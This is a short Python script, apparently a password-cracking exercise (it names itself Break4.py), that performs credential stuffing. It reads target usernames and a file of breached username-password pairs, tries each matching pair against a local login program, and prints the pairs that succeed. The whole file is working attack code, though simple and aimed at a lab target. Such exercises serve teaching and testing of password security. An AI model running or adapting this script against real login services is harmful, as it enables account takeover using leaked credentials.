import subprocess
import time

start_time = time.time()
usernames = set()
with open('./gang', 'r') as file:
    for line in file:
        username = line.strip()
        usernames.add(username)

passwords = []

with open('./PwnedPWfile', 'r') as file:
    for line in file:
        stripped = line.strip()
        splitted = stripped.split(',')
        if splitted[0] in usernames:
            result = subprocess.run(['python3', 'Login.pyc', splitted[0], splitted[1]], stdout = subprocess.PIPE, stderr = subprocess.PIPE, text = True)
            if result.returncode == 0:
                if result.stdout == 'Login successful.\n':
                    print(f"The password for {splitted[0]} is: {splitted[1]}")
                    
end_time = time.time()
elapsed_time = end_time - start_time
print(f"Break4.py took {elapsed_time:.2f} seconds to run")